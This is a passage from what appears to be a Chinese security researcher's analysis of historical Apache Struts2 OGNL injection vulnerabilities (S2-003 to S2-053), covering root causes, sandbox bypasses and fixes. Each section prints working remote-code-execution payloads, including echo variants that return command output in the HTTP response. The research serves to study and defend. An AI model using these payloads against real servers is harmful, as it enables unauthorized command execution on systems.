1('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0040java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app\\')')(bla)(bla) 先来看第一句，该条ognl表达式用于开启方法执行，因为在调用setParameters之前，开发人员考虑到了参数执行OGNL表达式的风险，所以提前关闭了函数调用执行 设置完了之后，再还原回来 但是OGNL表达式对于上下文的内容是可控的，我们可以在进行函数调用前，将context里的xwork.MethodAccessor.denyMethodExecution设为false， 这样第二句poc就可以执行函数调用了。 所以在发送这两条POC时，需要控制好设置false在前，执行在后（ascii排序，可以看回显poc的处理） 跟前面一样，写一下回显的POC 123456789(a)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla))(b)(('\\u0023ret\\u003d@java.lang.Runtime@getRuntime().exec(\\'id\\')')(bla))&amp; // 执行命令(c)(('\\u0023dis\\u003dnew\\u0020java.io.DataInputStream(\\u0023ret.getInputStream())')(bla))&amp;(d)(('\\u0023res\\u003dnew\\u0020byte[2000]')(bla))&amp;(e)(('\\u0023dis.readFully(\\u0023res)')(bla))&amp;(f)(('\\u0023writer\\u003d\\u0023context.get(\\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\\').getWriter()')(bla))&amp;(g)(('\\u0023writer.println(new\\u0020java.lang.String(\\u0023res))')(bla))&amp; // 获取response，回显数据(h)(('\\u0023writer.flush()')(bla))&amp;(i)(('\\u0023writer.close()')(bla)) 这里poc的先后顺序用到了第一个位置，实际的ognl表达式放到了第二个位置(1)((2)(3)) 修复xwork&gt;=2.0.6 com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters多了以下代码 低版本用的直接是已存在的OgnlValueStack，从2.0.6开始，使用了一个空的stack来处理参数的解析 并且从这个版本开始多了SecurityMemberAccess，用来限制ognl表达式中函数调用 在ognl.OgnlRuntime#callAppropriateMethod调用函数前，会去判断函数是否可被访问(method不为null) 其实这边isMethodAccessible的返回结果无所谓，但是不能在这个函数调用时出错，出错的话也就走不到invokeMethod 看一下具体的实现，isMethodAccessible的判断依赖于SecurityMemberAccess 这里我们主要看isAcceptableProperty 下端点调试你会发现这个版本acceptProperties为空，而excludeProperties非空，所以在调用isExclude函数时，正则调用pattern.matcher(null)会报错，也就无法达到调用函数的目的了（propertiesName为null）。 所以如果要绕过这个版本的限制，首先需要解决的是这个函数的报错问题，看S2-005 3. S2-005影响版本：struts2.0.0 - 2.1.8.1 S2-005为S2-003的修复绕过，直接分析POC POC分析123('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)&amp;('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0040java.lang.Runtime@getRuntime().exec(\\'open\\u0020/System/Applications/Calculator.app\\')')(bla)(bla) 前面S2-003修复部分说到了需要绕过isAcceptableProperty函数报错的问题才能继续往下进行函数调用。 从代码上看，只要excludeProperties和acceptProperties为空，就不会进到正则匹配的环节，所以需要将他们置为空 poc里的第一行做的就是这个事情，将excludeProperties置为空集合 这里看一下为什么以#_memberAccess的方式可以访问到OgnlContext对象的memberAccess属性 ognl.OgnlContext#get 从OgnlContext上下文获取内容，首先会判断是否在RESERVED_KEYS集合里，如果存在，则相应的调用他的getters，如果不存在，则从当前的上下文里去找这个key。 所以#_memeberAccess实际获取的是OgnlContext的memeberAccess属性内容 还有出现变化的地方，由于现在context里是没有response对象可以获取的，所以在处理回显的时候我们需要找另外的方法 12345678910(a)(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla))&amp;(a)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla))&amp;(b)(('\\u0023ret\\u003d@java.lang.Runtime@getRuntime().exec(\\'id\\')')(bla))&amp; // 执行命令(c)(('\\u0023dis\\u003dnew\\u0020java.io.DataInputStream(\\u0023ret.getInputStream())')(bla))&amp;(d)(('\\u0023res\\u003dnew\\u0020byte[2000]')(bla))&amp;(e)(('\\u0023dis.readFully(\\u0023res)')(bla))&amp;(f)(('\\u0023writer\\u003d@org.apache.struts2.ServletActionContext@getResponse().getWriter()')(bla))&amp;(g)(('\\u0023writer.println(new\\u0020java.lang.String(\\u0023res))')(bla))&amp; // 获取response，回显数据(h)(('\\u0023writer.flush()')(bla))&amp;(i)(('\\u0023writer.close()')(bla)) 这里使用了`@org.apache.struts2.ServletActionContext@getResponse()`静态方法来获取response 修复xwork&gt;=2.2.1.1，对参数名做了更为细致的正则检查[a-zA-Z0-9\\\\.\\\\]\\\\[\\\\(\\\\)_&#39;\\\\s]+ 4. S2-007这里跟S2-008里面的第一个漏洞一样 com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept value为我们传入的数据，过了一次getOverrideExpr 对我们的输入围上了单引号，这里如果我们的payload为&#39;+xxxx+&#39;，这里的xxxx就逃逸出来了，而不单单是字符串了 后续将处理好的数据放到了stack的overrides里面 而实际触发的地方跟S2-001一样，是在解析JSP的时候造成的 在tryFIndValue函数中，从stack的overrides中取出前面加了单引号的数据，并在后续调用Ognl.getValue，导致了Ognl表达式的执行。 POC1'+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) +' xwork&gt;=2.2.3，ognl表达式计算时，调用函数的函数判断isAcceptableProperty如果name为null直接返回true，所以我们不用像s2-005那样把excludeProperties置为空集合。 但是从这里开始，allowStaticMethodAccess默认为false，我们需要将其置为true，才能正常执行静态函数。 所以POC第一二句都是在解除限制，第三句执行命令 写一下回显的POC 12345678910111213'+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,#ret=@java.lang.Runtime@getRuntime().exec('id'),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close()) +' 5. S2-008S2-008一共有4个漏洞，详细看https://cwiki.apache.org/confluence/display/WW/S2-008 其中1跟S2-007类似，3不看了，主要关注2和4 CookieInterceptor这里的原理同S2-005类似，这里看代码比较直观，没有搭环境调了 org.apache.struts2.interceptor.CookieInterceptor#intercept 这里会到OgnlValueStack.setValue，也就是后续调用Ognl.setValue，用((1)(2))(3)的方式来执行任意OGNL表达式 DebuggingInterceptor 当开启开发者模式时，传入debug=command&amp;expression=xxxx，即可执行OGNL表达式 POC123?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))// 回显POC(%23_memberAccess.allowStaticMethodAccess=true,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),new java.lang.String(%23res)) 6. S2-009影响范围：2.0.0 - 2.3.1.1 针对S2-005的修复，对参数做[a-zA-Z0-9\\\\.\\\\]\\\\[\\\\(\\\\)_&#39;\\\\s]+正则检查，这里规避了参数名中出现#、unicode编码等 S2-009是对S2-005的绕过，这里用的就是Ognl.setValue函数的另一种用法a[(1)(2)]，还有一个比较巧妙的是，前面的几个漏洞利用，我们都是直接在(1)写上要执行的OGNL表达式，而S2-009则通过context里的内容来进行一个中转，将OGNL表达式放到key=value的value的位置，再由a[(key)(2)]的方式去执行value的内容。 123OgnlContext context = new OgnlContext();context.put(\"test\",\"@java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app/\\')\"); // 假设context存在执行系统命令的OGNL表达式testOgnl.setValue(\"a[(test)(bla)]\",context,\"\");// 以a[(test)(bla)],执行test所代表的OGNL表达式 上面代码中的假设，我们可以通过传入?param=xxx的方式带入 注意这里的param需要是当前Action的一个类属性（也就是原本就存在的参数名），比如原本表单里就有password，那么你就可以在password里面填充OGNL表达式 因为在计算OGNL表达式(password)(bla)的时候(解析出两个ASTProperty) 后续再执行过程中，会去查找当前的action里面是否含有这个属性 com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty 如果当前存在这个属性的时候，返回其内容 后续就是跟(1)(2)这种执行的原理一样，会以(1)作为node调用getValue。 这里巧妙的就是利用这种中转的方式，规避了参数名的正则检测 POC123?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&amp;z[(password)(bla)]=1// 回显POC?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&amp;z[(password)(bla)]=1 修复改进了正则 增加了setParameter函数，默认设置表达式不可执行 7. S2-012影响范围：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter.This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections. 看描述可以知道是struts2在处理redirect的时候出现的问题。 结果返回后回去调用ServletRedirectResult来处理 来看看该对象的实际处理函数org.apache.struts2.dispatcher.ServletRedirectResult#execute 在父类execute函数调用了conditionalParse函数 这里出现了我们比较熟悉的TextParseUtil.translateVariables，S2-001就是由这个函数来处理String类型转化的。 此时param为我们在struts.xml中的配置edit.action?skillName=${currentSkill.name} 前面分析过translateVariables，这里直切主题 出问题的地方跟S2-001一样 触发总共分为两步： 将xml配置中${currentSkill.name}解析成传入的值，此时stack.findValue会去找到前面处理好后的Result里面的currentSkill.name的值 由于translateVariables的解析OGNL表达式有两种$、%，并且是循环去处理的 首先是去处理$，将${currentSkill.name}解析成具体的值，并且将result的值置为他的内容 虽然已经修复了循环递归执行的问题(s2-001会执行两层${})，但是因为还循环去处理%，那么仍然可以达到循环递归计算的效果${另一层以%起始的ognl表达式}，所以POC里面需要用%{}来写入OGNL表达式 所以对于S2-012来说，配置中${currentSkill.name}是至关重要的 修复由于我前面分析的是2.2.3版本，后续的版本的translateVariables变化有点大，其修复版本 增加了pos来做起始位置来查找${}%{}，在第一次表达式执行完成后会更新pos值，来防止二次OGNL表达式执行 POC123currentSkill.name=%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,@java.lang.Runtime@getRuntime().exec(&apos;open /System/Applications/Calculator.app&apos;))&#125;// 回显POC%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#ret=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())&#125; 8. S2-013/S2-014影响范围：Struts 2.0.0 - Struts 2.3.14.1 这次的原理跟S2-001类似，只是问题出在解析&lt;s:a&gt;、&lt;s:url&gt;，当这两个标签支持includeParams 当当前的href为空时，会用当前url来填充href，也就是在buildUrl时导致的OGNL表达式的执行 这里不具体分析了，看一下他的执行栈 org.apache.struts2.views.util.DefaultUrlHelper#translateVariable 也同样是使用String转换时出现的OGNL表达式执行 POC123?fakeParam=%&#123;(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&#125;// 回显POC?fakeParam=%&#123;(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&#125; 修复 这里org.apache.struts2.views.util.DefaultUrlHelper不再使用TextParseUtil来处理 9. S2-015影响范围：Struts 2.0.0 - Struts 2.3.14.2 S2-015一共有两种： 第一种漏洞原理跟S2-012类似，这次问题不是出在重定向，而是在解析具体的action name时出现的问题 这里的{1}会被替换成xxx.action的xxx，这里的xxx如果被我们替换成OGNL表达式，会在后续的TextParseUtil.translateVariables得到执行，过程跟S2-012一样，不再叙述。 第二种是结果由httpheader来处理时，会将我们的${message}嵌套执行 org.apache.struts2.dispatcher.HttpHeaderResult#execute 跟S2-012一样，解析执行${另一层以%起始的OGNL表达式} POC1234// 摘自https://www.freebuf.com/vuls/217482.html%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action// 第二种？message=%&#123;#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ifconfig&apos;).getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125; 这里比较特殊的是这里对原有#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true，改成了 1234567// 原来的方式#_memberAccess['allowStaticMethodAccess']=true// 通过反射机制来设置#_memberAccess['allowStaticMethodAccess']#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true) 为什么要通过这种方式来写入呢？ 先来看OGNL是怎么setValue的 ognl.OgnlRuntime#setFieldValue 而此时这里我们要设置的#_memberAccess[&#39;allowStaticMethodAccess&#39;] 是final类型，我们不能使用普通的方式改变他的值，只能通过上面的反射的方式来进行修改。 这里的改变是从struts2 2.3.14.1版本开始的，意味着高于这个版本的以后的poc只能通过这种方式来设置 除了上面通过反射机制来进行绕过，我们也可以直接用构造器的方法来执行，比如new ProccessBuilder(&#39;id&#39;).start() 修复这里的修复就是S2-012的修复，主要修复了执行这种OGNL表达式${另一层%起始的OGNL表达式} 10. S2-016范围：Struts 2.0.0 - Struts 2.3.15 S2-016问题出在处理默认的action:xxx或redirect:xxx，后面跟的xxx为OGNL表达式，Struts2默认将用ServletRedirectResult来处理跳转问题，这里跟S2-012一样，只是这里的跳转设置在url里面 执行链路跟S2-012一样，不作分析了 POC1redirect:%&#123;#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125; 修复org.apache.struts2.dispatcher.mapper.DefaultActionMapper默认的redirect/redirectaction直接被删除了 action:部分因为S2-015的关系，限制了action名 已经不构成威胁了 11. S2-019范围：Struts 2.0.0 - Struts 2.3.15.1 S2-019跟S2-008的第二个漏洞一样，当开启开发者模式时，允许使用command的模式来执行OGNL表达式 具体看S2-008 POC1?debug=command&amp;expression=(%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23m=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close()) 修复这里后面的几个版本都是允许执行的，开发者模式下的command并没有被取消掉，所以如果在线上环境碰到debug模式，那就可以尝试一下OGNL表达式的执行 但是由于从struts2 2.3.20之后引入了黑名单模式（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），并且使用构造函数的方式也失效了 这里前辈们用到了将SecurityMemberAccess初始化的方式来绕过这个限制，原理可以好好看看这篇文章https://paper.seebug.org/794/#33-struts-2329。 1debug=command&amp;expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app'))) 后续还有一些绕过，后面再讲 12. S2-029/S2-036S2-029影响范围：Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3) S2-036影响范围：Struts 2.0.0 - Struts 2.3.28.1 （跟S2-029一样，主要在修复的地方讲） 原理跟S2-001差不多，S2-029的触发需要jsp用到标签&lt;s:textfield name=&quot;%{xxxx}&quot;&gt;&lt;/s:textfield&gt;，name属性中由一OGNL表达式解析而得，意味着生成的input标签的name属性是动态计算而得的，比如?xxxx=username，此时解析得到的input.name为username。这其中执行了%{xxxx}，获得xxxx的内容。而S2-001的修复主要解决的是递归计算OGNL表达式的问题，S2-029就是在进入translateVariables之前就将第一层的OGNL表达式执行完毕 直接看UIBean.evaluateParams 首先计算%{message}到我们传入的OGNL表达式 后续会在我们传入的OGNL表达式括上%{xxx} 此时再传入到findValue就是第二层的OGNL表达式，后续跟S2-001一样，只需要执行一次OGNL表达式计算即可 POC123456// 需要先初始化SecurityMemberAccess，不然无法执行?message=((%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))// 回显POC?message=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23ret=@java.lang.Runtime@getRuntime().exec('id')),%23q=@org.apache.commons.io.IOUtils@toString(%23ret.getInputStream()) // S2-036 ((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream())) 修复S2-029com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute 在计算表达式之前，验证是否可以执行 这里先看node.isEvalChain，这里是对S2-009做的限制，也就是当出现((1)(2))时，会解析出ASTEval节点，而ASTEval对象的isEvalChain函数直接返回true，也就使得(1)(2)无法执行 其次再来看node.isSequence，这里是对形如(xxx1,xxx2,xxx3)的OGNL表达式的限制，他将解析出ASTSequence节点，ASTSequence对象的isSequence直接返回true，也就限制了这种表达式的执行 然后比较有意思的是，对于形如((xxx1).(xxx2).(xxx3))的OGNL表达式，这是一种ASTChain，但其中并不会解析出ASTEval 看前面的分析，知道可以将S2-029的修复bypass掉，也就是S2-036的问题 13. S2-032/S2-033/S2-037影响范围：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3) 这里我的环境搭的是rest-showcase的，所以主要讲S2-033（S2-032的原理跟他差不多，只是触发变成了method:#_xxxx) rest-plugin支持解析xxx!method的调用 org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocation解析name!method，并对当前的restactionmapper设置好后续要调用method 在struts2的所有intercepter调用完毕后，会去调用DefaultActionInvocation的invokeActionOnly函数 而invokeActionOnly会去调用com.opensymphony.xwork2.DefaultActionInvocation#invokeAction 在这个函数里，我们可以看到他将前面可控的methodName放进了ognlUtil.getValue，导致了OGNL表达式的执行 需要注意的是，在前面调用的interceptor里不能出现异常的情况，会导致无法执行到OGNL表达式执行的位置。这也就是为什么不能在开启devMode的情况下进行利用的原因。 POC1234http://localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig// S2-037http://localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig 这里我们执行的命令用#parameters.command[0]的方式来获取，这是因为在生成DefaultActionProxy的时候对methodName做了转义处理，为了避免转义破坏OGNL表达式，用#parameters的方式从参数中获取。 还有一个需要注意的地方是，在最后调用ognlUtil.getValue时，在methodName后面拼接了()，我们需要将这个()做处理，比如这里的POC做的处理是#xx.toString去吃掉这个() S2-032/S2-033修复 xwork-core:2.3.28.1在OgnlUtil.isEvalExpression增加了isSequence的判断 这里出现了新的一种利用方式(1)?(2):(3)，这种形式的OGNL表达式将有ASTTest对象来处理 而isEvalChain()和isSequence()限制的是ASTEval和ASTSequence对象，这里并没有对ASTTest做限制，并且由于isSequence并不是递归去判断的，所以在ASTTest的children节点上再出现ASTSequence也是ok的 根据这个原理，我们可以写出新的POC 1(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json S2-037修复 在解析name!method的地方，调用了cleanupActionName 使用了正则，防止出现(#@)等特殊字符，出现就报错，也就到不了后续的OGNL表达式的执行 并且在禁止的class列表里增加了两个 使得我们不能在用`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`来绕过限制 一个有意思的地方前面说到这3个漏洞需要开启DynamicMethodInvocation，其实不开启也是可以的 前面说的几种方法都是在处理name!method这个格式，rest其实还支持对action/id/method的解析 所以改改POC就能通杀rest-plugin了 1http://localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig 14. S2-045/S2-046影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 S2-046原理一样，这里只分析S2-045 这里2.3和2.5版本变化比较大，这里以2.3.31的代码分析，看2.5的可以看https://paper.seebug.org/247/ 从struts2的工作流程图来看，所有的请求在生成ActionProxy之前，都由FilterDispatcher来处理，2.3版本用的是org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter，这里在调用action之前会先封装request。 看看调用栈 封装实际由org.apache.struts2.dispatcher.Dispatcher#wrapRequest处理 可以看到这里在处理Content-Type: multipart/form-data类型时，会生成org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper处理，S2-045就是出问题在这里 在用JakartaMultiPartRequest解析request包时，调用org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl来检查Content-Type的内容，需要由multipart/开头才行，不然就是报错并将具体的contentType内容写到异常里 这里我们的可控数据就到了异常上，就看struts2是怎么处理异常了 org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse 可控内容传入了com.opensymphony.xwork2.util.LocalizedTextUtil#findText 当前都没生成错误信息时，将获取默认的message 这里到了我们熟悉的TextParseUtil.translateVariables函数，他后续会处理计算OGNL表达式 简单来说，整个过程从报错开始存入OGNL表达式，再生成错误信息的时候计算了OGNL表达式 到了这里执行可控的OGNL表达式是第一步，因为2.3.29增加了对`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`的限制 需要一种新的思路来绕过，S2-045的POC就给我们提供这样一个思路 POC1234567891011121314151617181920%&#123;(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm): ( (#container=#context['com.opensymphony.xwork2.ActionContext.container']). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). (#ognlUtil.getExcludedPackageNames().clear()). (#ognlUtil.getExcludedClasses().clear()). (#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; 主要看5-10行，一开始的思路是直接用赋值的方式来覆盖存在限制的SecurityMemberAccess，但是现在有了excludedClasses的限制不能直接用这种方式来达成（具体看SecurityMemberAccess.isAccessible）。 那么就看看能不能用setters去设置SecurityMemberAccess 这里就看ognl.OgnlContext#setMemberAccess，而这个context就是我们在OGNL表达式里用#context表示的 那么直接用#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)就可以覆盖原有的MemberAccess，但是因为#context本身就是被禁止的类，我们不能直接调用他。 我们需要首先去除掉ExcludedPackageNames和ExcludedClasses 来看看他是怎么设置的com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil 可以看到securityMemberAccess的相关禁用设置都是来自于ognlUtil，这意味着我们只需要清除掉ognlUtil的禁用设置就可以消除掉securityMemberAccess的限制。这是因为在jvm里面他们用的都是同一个实例。 所以上面的POC中用struts2的container的方式去获取ognlUtil实例，并将其禁用设置全部清除掉 那么后面再用#context.setMemberAccess就没有阻碍了 后续的代码就是执行并回显了，跟前面的类似 修复 修复主要是不把message传入，放到了args的位置 15. S2-048这一部分不仔细说了，看https://www.freebuf.com/vuls/217482.html 16. S2-052影响范围:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12 The REST Plugin is using a XStreamHandler with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads. struts2的rest插件注册了ContentTypeInterceptor来处理不同的content-type 针对xml类型，将调用XStreamHandler来处理 org.apache.struts2.rest.ContentTypeInterceptor#intercept 根据request请求选择handler，这里我们传入application/xml类型，将使用org.apache.struts2.rest.handler.XStreamHandler#toObject来处理xml 这里用了最简单的调用方式（1.4.8版本），没有做xstream的相关安全处理，导致XStream反序列化 所以我们传入构造好的XML就可以达到命令执行 POC这里的xml可以用我的ysomap去生成，把Content-Type设置成application/xml就可以了 修复S2-052跟以往的漏洞不一样，这里跟OGNL表达式并没有什么关系了，修复也比较简单 升级XStream到了1.4.10版本，并且添加了安全措施 这里新添加了AllowedClasses、AllowedClassNames、XStreamPermissionProvider来设置每个类可以反序列化的对象列表 也会添加一些默认的类 这里的用法就是XStream官方推荐的，采用白名单的方式来防止不安全的反序列化 17. S2-053影响版本:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1 S2-053问题出在freemarker的标签内容可控时出现的问题 在action执行结束后，由于设置的类型为freemarker，所以结果交由freemarker来处理 关注对freemarker标签解析的类org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart 因为这里我们时url标签，所以由org.apache.struts2.components.URL#start来处理 回到了由ServletUrlRenderer来解析我们传入的OGNL表达式，跟S2-013一样，后续也是由TextParseUtil.translateVariables触发的 POCpoc可以直接用S2-045的poc 12%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;// 记得编码 修复 这次的修复是在FreemarkerManager中多了两行代码， 123&gt; LOG.debug(&quot;Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER&quot;, new String[0]);&gt; configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);&gt; 